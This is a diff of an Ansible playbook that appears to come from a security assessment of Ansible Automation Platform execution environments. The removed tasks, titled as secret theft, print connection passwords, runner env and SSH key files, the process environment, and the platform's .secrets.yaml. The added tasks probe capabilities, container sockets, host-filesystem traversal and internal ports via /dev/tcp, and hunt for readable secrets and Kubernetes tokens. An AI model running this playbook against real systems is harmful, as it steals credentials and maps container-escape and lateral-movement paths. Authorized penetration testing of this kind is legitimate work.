@@ -1,46 +1,54 @@
 ---
-- name: Recon - credential injection / secret theft
+- name: EE breakout assessment (read-only enumeration)
   hosts: all
   gather_facts: false
   tasks:
-    - name: Dump ansible connection variables (machine cred lands here)
-      ansible.builtin.debug:
-        msg:
-          - "ansible_user: {{ ansible_user | default('NOT SET') }}"
-          - "ansible_password: {{ ansible_password | default('NOT SET') }}"
-          - "ansible_become_password: {{ ansible_become_password | default('NOT SET') }}"
-
-    - name: Dump runner env files (look for injected creds / prompts)
+    - name: Container & privilege context
       ansible.builtin.shell: |
-        for f in /runner/env/envvars /runner/env/passwords /runner/env/settings /runner/env/ssh_key; do
-          echo " ### $f ###"
-          cat "$f" 2>/dev/null || echo "NOT Present"
-          echo
+        echo "=== whoami / id ==="; id
+        echo "=== am I PID namespace host? (PID1 cmd) ==="; cat /proc/1/comm 2>/dev/null; cat /proc/1/cgroup 2>/dev/null | head
+        echo "=== capabilities (CapEff) ==="; grep Cap /proc/self/status
+        echo "=== decode CapEff ==="; capsh --decode=$(grep CapEff /proc/self/status | awk '{print $2}') 2>/dev/null || echo "capsh N/A"
+        echo "=== /.dockerenv / container marker ==="; ls -la /.dockerenv 2>/dev/null; cat /run/.containerenv 2>/dev/null || echo "no podman marker"
+      register: ctx
+      changed_when: false
+    - ansible.builtin.debug: { var: ctx.stdout_lines }
+
+    - name: Host mounts & sensitive sockets exposed in EE
+      ansible.builtin.shell: |
+        echo "=== mounts ==="; mount 2>/dev/null || cat /proc/mounts
+        echo "=== look for host paths / docker.sock / podman.sock ==="
+        ls -la /var/run/docker.sock /run/podman/podman.sock 2>/dev/null || echo "no container socket"
+        echo "=== is host fs mounted? ==="
+        ls -la /host 2>/dev/null; ls -la /proc/1/root/etc/ansible-automation-platform/ 2>/dev/null || echo "no /proc/1/root traversal"
+      register: mnt
+      changed_when: false
+    - ansible.builtin.debug: { var: mnt.stdout_lines }
+
+    - name: Reachability of in-scope infra nodes from EE
+      ansible.builtin.shell: |
+        for h in 10.10.60.37 10.10.60.38 10.10.60.42 10.10.60.43 10.10.60.46 10.10.60.49; do
+          for p in 22 5432 443; do
+            echo -n "$h:$p -> "
+            timeout 2 bash -c "echo > /dev/tcp/$h/$p" 2>/dev/null && echo "OPEN" || echo "closed/filtered"
+          done
         done
-      register: allenv
+      register: net
       changed_when: false
+    - ansible.builtin.debug: { var: net.stdout_lines }
 
-    - name: Show runner env files
-      ansible.builtin.debug:
-        var: allenv.stdout_lines
-
-    - name: Dump full process environment (cloud creds land here)
-      ansible.builtin.shell: "cat /proc/self/environ | tr '\\0' '\\n'"
-      register: procenv
-      changed_when: false
-
-    - name: Show process environment
-      ansible.builtin.debug:
-        var: procenv.stdout_lines
-
-    - name: Can we reach the AAP-level secrets file?
+    - name: Look for credential material reachable from EE
       ansible.builtin.shell: |
-        ls -la /etc/ansible-automation-platform/ 2>/dev/null || echo "NOT MOUNTED IN EE"
-        echo "--- try .secrets.yaml ---"
-        cat /etc/ansible-automation-platform/.secrets.yaml 2>/dev/null || echo "NOT ACCESSIBLE"
-      register: aapsecrets
+        echo "=== AAP settings env paths (from earlier procenv) ==="
+        for f in /etc/ansible-automation-platform/settings.yaml \
+                 /etc/ansible-automation-platform/.secrets.yaml \
+                 /etc/ansible-automation-platform/awx/.secrets.yaml; do
+          echo -n "$f -> "; test -r "$f" && echo "READABLE" || echo "no"
+        done
+        echo "=== ssh keys / kube creds in EE ==="
+        ls -la ~/.ssh 2>/dev/null; ls -la /var/run/secrets/kubernetes.io 2>/dev/null || echo "no k8s sa token"
+        echo "=== mounted tokens / serviceaccount ==="
+        find /run /var/run -maxdepth 3 -name "token" 2>/dev/null
+      register: creds
       changed_when: false
-
-    - name: Show AAP secrets check
-      ansible.builtin.debug:
-        var: aapsecrets.stdout_lines
+    - ansible.builtin.debug: { var: creds.stdout_lines }
